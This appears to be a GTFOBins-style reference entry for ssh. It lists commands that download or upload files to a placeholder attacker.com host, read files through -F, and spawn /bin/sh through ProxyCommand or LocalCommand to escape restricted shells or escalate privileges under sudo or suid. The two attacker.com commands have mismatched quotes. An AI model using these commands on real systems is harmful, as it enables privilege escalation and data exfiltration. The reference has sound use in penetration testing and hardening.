---
type: gtfobin
name: ssh
platform: Unix
functions: [download, file-read, shell, upload]
tags: [gtfobin, unix, lotl]
---

# ssh

## download

```bash
ssh user@attacker.com 'cat /path/to/input-file"
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
ssh -F /path/to/input-file x
```
_The read file content is corrupted by error prints._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
ssh localhost /bin/sh
```
_Reconnecting may help bypassing restricted shells._
**Contexts:** sudo, suid, unprivileged

```bash
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
**Contexts:** sudo, unprivileged

```bash
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```
_Spawn the shell on the client, but still requires a successful remote connection._
**Contexts:** sudo, unprivileged

## upload

```bash
echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
```
**Contexts:** sudo, suid, unprivileged
